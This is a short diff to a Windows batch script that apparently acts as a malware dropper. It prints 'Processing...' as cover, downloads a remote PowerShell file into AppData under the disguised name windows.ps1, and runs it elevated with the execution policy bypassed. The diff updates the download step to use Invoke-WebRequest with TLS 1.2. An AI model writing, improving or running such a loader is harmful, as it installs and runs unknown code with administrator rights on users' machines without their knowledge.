@@ -4,10 +4,10 @@ set "DEST=%AppData%\windows.ps1"
 
 echo Processing...
 
-:: Use PowerShell to download the file quietly
-powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL%', '%DEST%')"
+:: Use PowerShell to download with TLS 1.2 enabled and bypass policy
+powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%URL%' -OutFile '%DEST%'"
 
-:: Run the downloaded PS1 as Administrator
+:: Run the downloaded PS1 as Administrator with Bypass enabled
 powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File ""%DEST%""'"
 
 exit
